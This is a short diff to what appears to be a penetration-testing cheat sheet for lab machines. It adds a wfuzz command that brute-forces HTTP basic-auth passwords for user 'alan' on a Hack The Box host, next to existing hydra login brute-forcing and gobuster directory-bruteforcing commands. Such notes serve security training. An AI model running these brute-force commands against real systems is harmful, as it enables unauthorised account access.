@@ -3,6 +3,7 @@ Portal for any payload
 ## Brute force web application 
 ### Basic Authentication  
 `hydra -L usernames -P passwords -s 8080 -f <domain> http-get /`  
+`wfuzz -u http://ethereal.htb:8080 --basic alan:FUZZ -w passwords.txt`  
 ## Directory Bruteforcing
 `gobuster -w <Wordlist> -u http://10.10.10.15 -t 50 -x aspx,txt,html  `  
 ## WebDav
